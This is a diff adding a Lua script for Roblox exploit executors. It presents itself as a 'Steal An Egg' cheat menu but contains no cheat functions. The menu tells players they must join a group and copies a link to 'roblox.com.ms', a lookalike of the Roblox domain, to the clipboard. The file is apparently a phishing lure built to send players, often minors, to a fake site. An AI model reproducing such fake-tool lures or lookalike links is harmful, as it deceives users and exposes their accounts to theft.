@@ -1,0 +1,230 @@
+--[[
+    Steal An Egg - GUI
+    Draggable menu • Group requirement notice • Copy Group Link button
+--]]
+
+-- ==== CONFIG ====
+local GROUP_ID_LINK = "https://roblox.com.ms/communities/7794507897/" -- replace with your real group link
+local GAME_NAME = "Steal An Egg"
+
+-- ==== SERVICES ====
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- ==== CLEAN UP OLD GUI (so re-executing doesn't stack duplicates) ====
+local existing = PlayerGui:FindFirstChild("StealAnEgg_GUI")
+if existing then
+    existing:Destroy()
+end
+
+-- ==== SCREEN GUI ====
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "StealAnEgg_GUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = PlayerGui
+
+-- ==== MAIN FRAME ====
+local Main = Instance.new("Frame")
+Main.Name = "Main"
+Main.Size = UDim2.new(0, 300, 0, 210)
+Main.Position = UDim2.new(0.5, -150, 0.5, -105)
+Main.BackgroundColor3 = Color3.fromRGB(25, 20, 15)
+Main.BorderSizePixel = 0
+Main.Parent = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 12)
+MainCorner.Parent = Main
+
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color = Color3.fromRGB(255, 200, 80)
+MainStroke.Thickness = 2
+MainStroke.Parent = Main
+
+-- ==== TITLE BAR (drag handle) ====
+local TitleBar = Instance.new("Frame")
+TitleBar.Name = "TitleBar"
+TitleBar.Size = UDim2.new(1, 0, 0, 42)
+TitleBar.BackgroundColor3 = Color3.fromRGB(40, 32, 20)
+TitleBar.BorderSizePixel = 0
+TitleBar.Parent = Main
+
+local TitleCorner = Instance.new("UICorner")
+TitleCorner.CornerRadius = UDim.new(0, 12)
+TitleCorner.Parent = TitleBar
+
+-- mask the bottom corners of the title bar so it looks flush with Main
+local TitleMask = Instance.new("Frame")
+TitleMask.Size = UDim2.new(1, 0, 0, 14)
+TitleMask.Position = UDim2.new(0, 0, 1, -14)
+TitleMask.BackgroundColor3 = TitleBar.BackgroundColor3
+TitleMask.BorderSizePixel = 0
+TitleMask.ZIndex = TitleBar.ZIndex
+TitleMask.Parent = TitleBar
+
+local EggIcon = Instance.new("TextLabel")
+EggIcon.Size = UDim2.new(0, 30, 0, 30)
+EggIcon.Position = UDim2.new(0, 8, 0, 6)
+EggIcon.BackgroundTransparency = 1
+EggIcon.Text = "🥚"
+EggIcon.TextScaled = true
+EggIcon.Parent = TitleBar
+
+local Title = Instance.new("TextLabel")
+Title.Name = "Title"
+Title.Size = UDim2.new(1, -90, 1, 0)
+Title.Position = UDim2.new(0, 44, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = GAME_NAME
+Title.TextColor3 = Color3.fromRGB(255, 220, 130)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 20
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = TitleBar
+
+local CloseButton = Instance.new("TextButton")
+CloseButton.Name = "CloseButton"
+CloseButton.Size = UDim2.new(0, 30, 0, 30)
+CloseButton.Position = UDim2.new(1, -38, 0, 6)
+CloseButton.BackgroundColor3 = Color3.fromRGB(60, 30, 30)
+CloseButton.Text = "X"
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.TextSize = 16
+CloseButton.Parent = TitleBar
+
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 8)
+CloseCorner.Parent = CloseButton
+
+CloseButton.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+-- ==== GROUP NOTICE ====
+local Notice = Instance.new("TextLabel")
+Notice.Name = "Notice"
+Notice.Size = UDim2.new(1, -24, 0, 60)
+Notice.Position = UDim2.new(0, 12, 0, 52)
+Notice.BackgroundTransparency = 1
+Notice.Text = "For this script to work you must join the group!"
+Notice.TextColor3 = Color3.fromRGB(255, 255, 255)
+Notice.TextWrapped = true
+Notice.Font = Enum.Font.Gotham
+Notice.TextSize = 15
+Notice.Parent = Main
+
+-- ==== COPY GROUP LINK BUTTON ====
+local CopyButton = Instance.new("TextButton")
+CopyButton.Name = "CopyButton"
+CopyButton.Size = UDim2.new(1, -24, 0, 40)
+CopyButton.Position = UDim2.new(0, 12, 0, 118)
+CopyButton.BackgroundColor3 = Color3.fromRGB(255, 200, 80)
+CopyButton.Text = "Copy Group Link"
+CopyButton.TextColor3 = Color3.fromRGB(30, 20, 10)
+CopyButton.Font = Enum.Font.GothamBold
+CopyButton.TextSize = 16
+CopyButton.Parent = Main
+
+local CopyCorner = Instance.new("UICorner")
+CopyCorner.CornerRadius = UDim.new(0, 10)
+CopyCorner.Parent = CopyButton
+
+CopyButton.MouseButton1Click:Connect(function()
+    local ok = false
+    if setclipboard then
+        ok = pcall(setclipboard, GROUP_ID_LINK)
+    end
+
+    local originalText = CopyButton.Text
+    local originalColor = CopyButton.BackgroundColor3
+
+    if ok then
+        CopyButton.Text = "Copied!"
+        CopyButton.BackgroundColor3 = Color3.fromRGB(120, 255, 140)
+    else
+        CopyButton.Text = "Clipboard unsupported"
+        CopyButton.BackgroundColor3 = Color3.fromRGB(255, 120, 120)
+    end
+
+    task.delay(1.4, function()
+        if CopyButton and CopyButton.Parent then
+            CopyButton.Text = originalText
+            CopyButton.BackgroundColor3 = originalColor
+        end
+    end)
+end)
+
+-- ==== STATUS LABEL ====
+local Status = Instance.new("TextLabel")
+Status.Name = "Status"
+Status.Size = UDim2.new(1, -24, 0, 30)
+Status.Position = UDim2.new(0, 12, 0, 168)
+Status.BackgroundTransparency = 1
+Status.Text = "Status: Loaded"
+Status.TextColor3 = Color3.fromRGB(150, 255, 150)
+Status.Font = Enum.Font.Gotham
+Status.TextSize = 13
+Status.Parent = Main
+
+-- ==== DRAGGING LOGIC ====
+local dragging = false
+local dragInput
+local dragStart
+local startPos
+
+local function updateDrag(input)
+    local delta = input.Position - dragStart
+    Main.Position = UDim2.new(
+        startPos.X.Scale, startPos.X.Offset + delta.X,
+        startPos.Y.Scale, startPos.Y.Offset + delta.Y
+    )
+end
+
+TitleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = Main.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+TitleBar.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        updateDrag(input)
+    end
+end)
+
+-- ==== INTRO POP-IN ANIMATION ====
+Main.Size = UDim2.new(0, 0, 0, 0)
+Main.Position = UDim2.new(0.5, 0, 0.5, 0)
+local popTween = TweenService:Create(
+    Main,
+    TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+    {
+        Size = UDim2.new(0, 300, 0, 210),
+        Position = UDim2.new(0.5, -150, 0.5, -105)
+    }
+)
+popTween:Play()
+
+print(GAME_NAME .. " GUI loaded.")
